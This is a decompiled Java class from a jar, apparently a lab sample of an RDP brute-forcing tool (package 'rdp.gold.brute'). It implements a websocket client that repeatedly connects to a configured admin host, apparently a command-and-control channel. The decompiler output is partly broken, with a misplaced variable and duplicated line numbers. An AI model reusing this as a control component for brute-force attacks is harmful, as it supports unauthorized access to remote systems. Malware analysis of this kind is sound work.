/*    */ package rdp.gold.brute.synchronizer;
/*    */ 
/*    */ import java.io.PrintWriter;
/*    */ import java.io.StringWriter;
/*    */ import java.net.URI;
/*    */ import org.apache.log4j.Logger;
/*    */ import org.eclipse.jetty.websocket.client.ClientUpgradeRequest;
/*    */ import org.eclipse.jetty.websocket.client.WebSocketClient;
/*    */ import rdp.gold.brute.Config;
/*    */ 
/*    */ public class SynchronizerClient extends Thread
/*    */ {
/* 13 */   private final Logger logger = Logger.getLogger(SynchronizerClient.class);
/*    */   
/*    */ 
/*    */ 
/*    */   public void run()
/*    */   {
/*    */     for (;;)
/*    */     {
/* 21 */       this.logger.info("Start syncrhonizer");
/*    */       
/* 23 */       String destUri = "ws://" + Config.HOST_ADMIN + ":" + Config.PORT_ADMIN;
/*    */       
/* 25 */       WebSocketClient client = new WebSocketClient();
/* 26 */       SynchronizerSocket socket = new SynchronizerSocket();
/*    */       try
/*    */       {
/* 29 */         client.start();
/*    */         
/* 31 */         URI echoUri = new URI(destUri);
/* 32 */         ClientUpgradeRequest request = new ClientUpgradeRequest();
/* 33 */         client.connect(socket, echoUri, request);
/*    */         
/* 35 */         this.logger.info("Run connect to server on ip: " + Config.HOST_ADMIN + ":" + Config.PORT_ADMIN);
/*    */         
/* 37 */         socket.start();
/* 38 */         socket.join();
/*    */         
/*    */ 
/*    */ 
/*    */ 
/*    */         try
/*    */         {
/* 45 */           client.stop();
/*    */         } catch (Exception e) {
/* 47 */           e.printStackTrace();
/*    */         }
/*    */         try
/*    */         {
/*    */           StringWriter sw;
/* 52 */           Thread.sleep(1000L);
/*    */         } catch (InterruptedException e) {
/* 54 */           this.logger.error(e);
/*    */         }
/*    */       }
/*    */       catch (Exception e)
/*    */       {
/* 40 */         sw = new StringWriter();
/* 41 */         e.printStackTrace(new PrintWriter(sw));
/* 42 */         this.logger.error(e + " " + sw);
/*    */       } finally {
/*    */         try {
/* 45 */           client.stop();
/*    */         } catch (Exception e) {
/* 47 */           e.printStackTrace();
/*    */         }
/*    */       }
/*    */     }
/*    */   }
/*    */ }


/* Location:              C:\Users\Lab\Desktop\a.jar!\rdp\gold\brute\synchronizer\SynchronizerClient.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       0.7.1
 */